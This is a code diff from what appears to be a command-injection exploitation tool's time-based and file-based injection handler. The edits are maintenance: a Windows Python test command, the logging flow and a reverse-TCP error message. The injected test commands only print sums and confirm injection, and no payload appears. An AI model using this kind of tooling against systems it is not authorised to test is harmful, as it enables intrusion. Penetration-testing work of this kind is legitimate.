@@ -106,6 +106,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
     print settings.print_critical_msg(err_msg)
 
   whitespace = checks.check_whitespaces()
+
   if settings.VERBOSITY_LEVEL >= 1:
     info_msg ="Testing the " + technique + "... "
     print settings.print_info_msg(info_msg)
@@ -265,7 +266,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
 
                     if settings.TARGET_OS == "win":
                       if alter_shell:
-                        cmd = settings.WIN_PYTHON_DIR + "python.exe -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
+                        cmd = settings.WIN_PYTHON_DIR + " -c \"print (" + str(randv1) + " + " + str(randv2) + ")\""
                       else:
                         cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
                     else:
@@ -333,14 +334,10 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                     percent = ""
                 else:
                   percent = str(float_percent) + "%"
-                #Print logs notification message
-                #percent = Fore.BLUE + "FINISHED" + Style.RESET_ALL
-                info_msg =  "Testing the " + technique + "... " +  "[ " + percent + " ]"
-                sys.stdout.write("\r" + settings.print_info_msg(info_msg))
-                sys.stdout.flush()
-                print ""
-                logs.logs_notification(filename)
-                raise
+                  print ""
+                  # Print logs notification message
+                  logs.logs_notification(filename)
+                #raise
               else:
                 percent = str(float_percent) + "%"
             break
@@ -570,7 +567,7 @@ def tfb_injection_handler(url, delay, filename, tmp_path, http_request_method, u
                             shell = cb_injector.injection_results(response, TAG, cmd)
                             if settings.VERBOSITY_LEVEL >= 1:
                               print ""
-                            err_msg = "The reverse TCP connection has been failed!"
+                            err_msg = "The reverse TCP connection has failed!"
                             print settings.print_critical_msg(err_msg)
                         else:
                           pass
